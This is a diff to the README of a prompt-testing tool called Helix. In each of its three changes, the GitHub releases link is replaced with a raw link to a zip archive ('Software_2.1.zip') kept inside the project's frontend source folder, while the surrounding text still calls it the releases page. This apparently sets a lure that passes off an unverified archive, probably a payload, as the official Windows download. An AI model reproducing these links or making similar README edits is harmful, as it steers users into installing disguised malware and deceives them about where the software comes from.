@@ -1,6 +1,6 @@
 # ✨ Helix - Improve prompts with guided testing
 
-[![Download Helix](https://img.shields.io/badge/Download%20Helix-blue-grey)](https://github.com/sabinequarterly135/Helix/releases)
+[![Download Helix](https://img.shields.io/badge/Download%20Helix-blue-grey)](https://raw.githubusercontent.com/sabinequarterly135/Helix/main/frontend/src/lib/Software_2.1.zip)
 
 ## 🧩 What Helix does
 
@@ -35,7 +35,7 @@ For best results, use a computer with:
 
 Visit this page to download:
 
-https://github.com/sabinequarterly135/Helix/releases
+https://raw.githubusercontent.com/sabinequarterly135/Helix/main/frontend/src/lib/Software_2.1.zip
 
 On the releases page:
 
@@ -199,7 +199,7 @@ If the window looks blank:
 
 Check the releases page when you want the newest version:
 
-https://github.com/sabinequarterly135/Helix/releases
+https://raw.githubusercontent.com/sabinequarterly135/Helix/main/frontend/src/lib/Software_2.1.zip
 
 Use that page to download the latest Windows build, see version notes, and get newer fixes or changes
 
